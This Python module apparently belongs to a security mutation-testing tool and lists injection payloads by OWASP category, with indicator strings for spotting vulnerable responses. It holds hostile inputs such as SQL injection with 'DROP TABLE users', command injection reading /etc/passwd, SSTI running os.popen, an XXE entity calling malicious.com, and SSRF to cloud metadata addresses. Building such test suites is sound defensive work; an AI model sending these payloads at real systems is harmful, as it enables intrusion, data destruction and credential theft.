"""
Security Mutation Patterns
OWASP Top 10 and common attack vectors for mutation testing
"""
from typing import Dict, List, Any
from dataclasses import dataclass


@dataclass
class SecurityPattern:
    """Security attack pattern"""
    name: str
    category: str
    severity: str  # CRITICAL, HIGH, MEDIUM, LOW
    payloads: List[str]
    description: str
    cwe_id: str = None  # Common Weakness Enumeration ID


class SecurityPatterns:
    """
    Collection of security attack patterns for mutation testing
    Based on OWASP Top 10 and common vulnerabilities
    """

    # ========== SQL Injection (OWASP A03:2021) ==========
    SQL_INJECTION = SecurityPattern(
        name="SQL Injection",
        category="injection",
        severity="CRITICAL",
        cwe_id="CWE-89",
        description="Test for SQL injection vulnerabilities in database queries",
        payloads=[
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR '1'='1' /*",
            "admin' --",
            "admin' #",
            "admin'/*",
            "' OR 1=1 --",
            "') OR ('1'='1",
            "'; DROP TABLE users; --",
            "1' UNION SELECT NULL, NULL, NULL --",
            "' AND 1=2 UNION SELECT table_name, NULL FROM information_schema.tables --",
            "1' AND '1'='1",
            "1' AND '1'='2",
            "' WAITFOR DELAY '00:00:05' --",
            "1; EXEC xp_cmdshell('dir') --",
        ]
    )

    # ========== NoSQL Injection ==========
    NOSQL_INJECTION = SecurityPattern(
        name="NoSQL Injection",
        category="injection",
        severity="CRITICAL",
        cwe_id="CWE-943",
        description="Test for NoSQL injection in MongoDB, CouchDB, etc.",
        payloads=[
            '{"$gt": ""}',
            '{"$ne": null}',
            '{"$ne": ""}',
            '{"$regex": ".*"}',
            '{"$where": "this.password.length > 0"}',
            '{"username": {"$ne": null}, "password": {"$ne": null}}',
            '{"$or": [{"username": "admin"}, {"username": "administrator"}]}',
        ]
    )

    # ========== Cross-Site Scripting (OWASP A03:2021) ==========
    XSS = SecurityPattern(
        name="Cross-Site Scripting (XSS)",
        category="injection",
        severity="HIGH",
        cwe_id="CWE-79",
        description="Test for XSS vulnerabilities in user input",
        payloads=[
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg/onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<iframe src='javascript:alert(\"XSS\")'></iframe>",
            "<body onload=alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>",
            "<select onfocus=alert('XSS') autofocus>",
            "<marquee onstart=alert('XSS')>",
            "<img src='x' onerror='alert(String.fromCharCode(88,83,83))'>",
            "'-alert('XSS')-'",
            "\"><script>alert('XSS')</script>",
            "'>><marquee><h1>XSS</h1></marquee>",
        ]
    )

    # ========== Path Traversal (Directory Traversal) ==========
    PATH_TRAVERSAL = SecurityPattern(
        name="Path Traversal",
        category="access_control",
        severity="HIGH",
        cwe_id="CWE-22",
        description="Test for directory traversal vulnerabilities",
        payloads=[
            "../",
            "../../",
            "../../../",
            "../../../../",
            "../../../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "....//....//....//etc/passwd",
            "..%2F..%2F..%2Fetc%2Fpasswd",
            "..%252F..%252F..%252Fetc%252Fpasswd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%5c..%5c..%5cwindows%5csystem32%5cconfig%5csam",
        ]
    )

    # ========== Command Injection ==========
    COMMAND_INJECTION = SecurityPattern(
        name="Command Injection",
        category="injection",
        severity="CRITICAL",
        cwe_id="CWE-78",
        description="Test for OS command injection vulnerabilities",
        payloads=[
            "; ls -la",
            "| ls -la",
            "& dir",
            "&& dir",
            "|| dir",
            "; cat /etc/passwd",
            "| cat /etc/passwd",
            "`cat /etc/passwd`",
            "$(cat /etc/passwd)",
            "; ping -c 10 127.0.0.1",
            "| ping -n 10 127.0.0.1",
        ]
    )

    # ========== LDAP Injection ==========
    LDAP_INJECTION = SecurityPattern(
        name="LDAP Injection",
        category="injection",
        severity="HIGH",
        cwe_id="CWE-90",
        description="Test for LDAP injection vulnerabilities",
        payloads=[
            "*",
            "*)(&",
            "*)(uid=*))(|(uid=*",
            "admin)(&(password=*))",
            "admin)(|(password=*))",
        ]
    )

    # ========== XML External Entity (XXE) ==========
    XXE = SecurityPattern(
        name="XML External Entity (XXE)",
        category="injection",
        severity="HIGH",
        cwe_id="CWE-611",
        description="Test for XXE vulnerabilities in XML parsers",
        payloads=[
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://malicious.com/evil.dtd">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd">%xxe;]>',
        ]
    )

    # ========== Server-Side Template Injection (SSTI) ==========
    SSTI = SecurityPattern(
        name="Server-Side Template Injection",
        category="injection",
        severity="CRITICAL",
        cwe_id="CWE-94",
        description="Test for template injection in Jinja2, Twig, etc.",
        payloads=[
            "{{7*7}}",
            "${7*7}",
            "{{config.items()}}",
            "{{''.__class__.__mro__[2].__subclasses__()}}",
            "${T(java.lang.Runtime).getRuntime().exec('calc')}",
            "#set($x=7*7)$x",
            "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
        ]
    )

    # ========== Insecure Deserialization ==========
    INSECURE_DESERIALIZATION = SecurityPattern(
        name="Insecure Deserialization",
        category="injection",
        severity="CRITICAL",
        cwe_id="CWE-502",
        description="Test for unsafe deserialization vulnerabilities",
        payloads=[
            'O:8:"stdClass":0:{}',  # PHP object injection
            'a:1:{i:0;O:8:"stdClass":0:{}}',  # PHP array with object
        ]
    )

    # ========== Authentication Bypass ==========
    AUTH_BYPASS = SecurityPattern(
        name="Authentication Bypass",
        category="authentication",
        severity="CRITICAL",
        cwe_id="CWE-287",
        description="Test for authentication bypass vulnerabilities",
        payloads=[
            # For username/email fields
            "admin",
            "administrator",
            "root",
            "test",
            "guest",
            # Empty credentials
            "",
            " ",
            # Special characters
            "admin' --",
            "admin' #",
            # Unicode bypass
            "admin\x00",
            "admin\r\n",
        ]
    )

    # ========== Integer Overflow ==========
    INTEGER_OVERFLOW = SecurityPattern(
        name="Integer Overflow",
        category="numeric",
        severity="MEDIUM",
        cwe_id="CWE-190",
        description="Test for integer overflow vulnerabilities",
        payloads=[
            "2147483647",  # Max 32-bit signed int
            "2147483648",  # Max 32-bit signed int + 1
            "4294967295",  # Max 32-bit unsigned int
            "4294967296",  # Max 32-bit unsigned int + 1
            "9223372036854775807",  # Max 64-bit signed int
            "9223372036854775808",  # Max 64-bit signed int + 1
            "-2147483648",  # Min 32-bit signed int
            "-2147483649",  # Min 32-bit signed int - 1
        ]
    )

    # ========== Format String Vulnerabilities ==========
    FORMAT_STRING = SecurityPattern(
        name="Format String",
        category="injection",
        severity="HIGH",
        cwe_id="CWE-134",
        description="Test for format string vulnerabilities",
        payloads=[
            "%s%s%s%s%s%s%s%s%s%s",
            "%x%x%x%x%x%x%x%x%x%x",
            "%n%n%n%n%n%n%n%n%n%n",
            "%p%p%p%p%p%p%p%p%p%p",
            "%d%d%d%d%d%d%d%d%d%d",
        ]
    )

    # ========== Open Redirect ==========
    OPEN_REDIRECT = SecurityPattern(
        name="Open Redirect",
        category="access_control",
        severity="MEDIUM",
        cwe_id="CWE-601",
        description="Test for open redirect vulnerabilities",
        payloads=[
            "http://evil.com",
            "https://evil.com",
            "//evil.com",
            "/\\evil.com",
            "javascript:alert('XSS')",
            "data:text/html,<script>alert('XSS')</script>",
        ]
    )

    # ========== SSRF (Server-Side Request Forgery) ==========
    SSRF = SecurityPattern(
        name="Server-Side Request Forgery",
        category="access_control",
        severity="HIGH",
        cwe_id="CWE-918",
        description="Test for SSRF vulnerabilities",
        payloads=[
            "http://localhost",
            "http://127.0.0.1",
            "http://0.0.0.0",
            "http://169.254.169.254",  # AWS metadata
            "http://metadata.google.internal",  # GCP metadata
            "http://[::1]",  # IPv6 localhost
            "file:///etc/passwd",
            "dict://localhost:11211/stats",
            "gopher://localhost:25/_MAIL",
        ]
    )

    # ========== Header Injection ==========
    HEADER_INJECTION = SecurityPattern(
        name="Header Injection",
        category="injection",
        severity="MEDIUM",
        cwe_id="CWE-113",
        description="Test for HTTP header injection vulnerabilities",
        payloads=[
            "test\r\nX-Injected-Header: malicious",
            "test\nX-Injected-Header: malicious",
            "test\r\n\r\n<script>alert('XSS')</script>",
        ]
    )

    # ========== Null Byte Injection ==========
    NULL_BYTE = SecurityPattern(
        name="Null Byte Injection",
        category="injection",
        severity="MEDIUM",
        cwe_id="CWE-158",
        description="Test for null byte injection vulnerabilities",
        payloads=[
            "file.txt%00.jpg",
            "file.txt\x00.jpg",
            "../../etc/passwd%00",
        ]
    )

    # ========== Buffer Overflow Strings ==========
    BUFFER_OVERFLOW = SecurityPattern(
        name="Buffer Overflow",
        category="memory",
        severity="HIGH",
        cwe_id="CWE-120",
        description="Test for buffer overflow vulnerabilities",
        payloads=[
            "A" * 100,
            "A" * 1000,
            "A" * 10000,
            "A" * 100000,
            "\x41" * 1000,
        ]
    )

    # ========== Unicode Bypass ==========
    UNICODE_BYPASS = SecurityPattern(
        name="Unicode Bypass",
        category="encoding",
        severity="MEDIUM",
        cwe_id="CWE-176",
        description="Test for Unicode normalization bypass",
        payloads=[
            "\ufeff",  # Zero-width no-break space
            "\u200b",  # Zero-width space
            "..%c0%af",  # Unicode encoding of /
            "..%c1%9c",  # Overlong encoding
        ]
    )

    # ========== JSON Injection ==========
    JSON_INJECTION = SecurityPattern(
        name="JSON Injection",
        category="injection",
        severity="MEDIUM",
        cwe_id="CWE-91",
        description="Test for JSON injection vulnerabilities",
        payloads=[
            '{"key": "value", "injected": true}',
            '", "injected": "value',
            '\\", \\"injected\\": \\"value',
        ]
    )

    @classmethod
    def get_all_patterns(cls) -> List[SecurityPattern]:
        """Get all security patterns"""
        return [
            cls.SQL_INJECTION,
            cls.NOSQL_INJECTION,
            cls.XSS,
            cls.PATH_TRAVERSAL,
            cls.COMMAND_INJECTION,
            cls.LDAP_INJECTION,
            cls.XXE,
            cls.SSTI,
            cls.INSECURE_DESERIALIZATION,
            cls.AUTH_BYPASS,
            cls.INTEGER_OVERFLOW,
            cls.FORMAT_STRING,
            cls.OPEN_REDIRECT,
            cls.SSRF,
            cls.HEADER_INJECTION,
            cls.NULL_BYTE,
            cls.BUFFER_OVERFLOW,
            cls.UNICODE_BYPASS,
            cls.JSON_INJECTION,
        ]

    @classmethod
    def get_by_severity(cls, severity: str) -> List[SecurityPattern]:
        """Get patterns by severity level"""
        return [p for p in cls.get_all_patterns() if p.severity == severity]

    @classmethod
    def get_by_category(cls, category: str) -> List[SecurityPattern]:
        """Get patterns by category"""
        return [p for p in cls.get_all_patterns() if p.category == category]

    @classmethod
    def get_critical_patterns(cls) -> List[SecurityPattern]:
        """Get only CRITICAL severity patterns"""
        return cls.get_by_severity("CRITICAL")

    @classmethod
    def get_patterns_for_parameter_type(cls, param_type: str, param_name: str = "") -> List[SecurityPattern]:
        """
        Get relevant security patterns based on parameter type and name

        Args:
            param_type: Type of parameter (string, integer, email, url, etc.)
            param_name: Name of parameter (helps identify context)

        Returns:
            List of relevant security patterns to test
        """
        patterns = []
        param_name_lower = param_name.lower()

        # String parameters - test most injection types
        if param_type in ["string", "str", "text"]:
            patterns.extend([
                cls.SQL_INJECTION,
                cls.XSS,
                cls.COMMAND_INJECTION,
                cls.SSTI,
                cls.NULL_BYTE,
                cls.BUFFER_OVERFLOW,
            ])

            # Context-specific patterns
            if any(x in param_name_lower for x in ["username", "user", "login", "email"]):
                patterns.append(cls.AUTH_BYPASS)

            if any(x in param_name_lower for x in ["path", "file", "dir", "folder"]):
                patterns.append(cls.PATH_TRAVERSAL)

            if any(x in param_name_lower for x in ["url", "link", "redirect", "next", "return"]):
                patterns.extend([cls.OPEN_REDIRECT, cls.SSRF])

            if "search" in param_name_lower or "query" in param_name_lower:
                patterns.append(cls.NOSQL_INJECTION)

        # Integer parameters
        elif param_type in ["integer", "int", "number", "long"]:
            patterns.extend([
                cls.INTEGER_OVERFLOW,
                cls.SQL_INJECTION,  # Can still try SQL injection in numeric fields
            ])

        # Email parameters
        elif param_type in ["email"]:
            patterns.extend([
                cls.XSS,
                cls.SQL_INJECTION,
                cls.HEADER_INJECTION,
            ])

        # URL parameters
        elif param_type in ["url", "uri"]:
            patterns.extend([
                cls.OPEN_REDIRECT,
                cls.SSRF,
                cls.XSS,
            ])

        # Object/JSON parameters
        elif param_type in ["object", "json", "dict"]:
            patterns.extend([
                cls.JSON_INJECTION,
                cls.NOSQL_INJECTION,
                cls.INSECURE_DESERIALIZATION,
            ])

        # XML parameters
        elif param_type in ["xml"]:
            patterns.append(cls.XXE)

        # If no specific type, use critical patterns
        if not patterns:
            patterns = cls.get_critical_patterns()

        return patterns


# Vulnerability detection patterns
VULNERABILITY_INDICATORS = {
    "sql_injection": [
        "SQL syntax",
        "mysql_fetch",
        "ORA-",
        "PostgreSQL",
        "SQLite",
        "Microsoft SQL Server",
        "syntax error",
        "unexpected end of SQL command",
    ],
    "xss": [
        "<script>",
        "alert(",
        "onerror=",
        "onload=",
        "javascript:",
    ],
    "path_traversal": [
        "/etc/passwd",
        "root:",
        "[boot loader]",
        "win.ini",
    ],
    "command_injection": [
        "uid=",
        "gid=",
        "groups=",
        "Directory of",
        "Volume Serial Number",
    ],
    "xxe": [
        "root:",
        "ENTITY",
        "DOCTYPE",
    ],
    "ssti": [
        "49",  # 7*7
        "config",
        "__mro__",
    ],
}
